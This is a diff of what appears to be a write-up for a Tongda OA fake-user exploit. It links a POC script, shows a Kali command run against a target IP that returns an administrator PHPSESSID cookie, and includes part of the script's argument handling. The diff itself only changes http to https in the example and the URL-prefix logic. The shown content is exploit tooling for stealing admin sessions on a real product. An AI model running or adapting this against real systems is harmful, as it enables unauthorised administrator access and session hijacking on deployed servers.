@@ -30,7 +30,7 @@ Double-click to install
 Use [POC](https://github.com/NS-Sp4ce/TongDaOA-Fake-User/blob/master/POC.py) to get the administrator's cookies
 
 ```plain
-root@kali:~/桌面# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx
+root@kali:~/桌面# python3 1.py -v 11 -u https://xx.xxx.xxx.xxx
 [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/
 ```
 
@@ -133,12 +133,12 @@ if __name__ == "__main__":
         "-url",
         "--targeturl",
         type=str,
-        help="Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1"
+        help="Target URL. e.g: -url 192.168.2.1、-url https://192.168.2.1"
     )
     args = parser.parse_args()
     url = args.targeturl
-    if 'http://' not in url:
-        url = 'http://' + url
+    if 'https://' not in url:
+        url = 'https://' + url
     if args.tdoaversion == 11:
         getV11Session(url)
     elif args.tdoaversion == 2017:
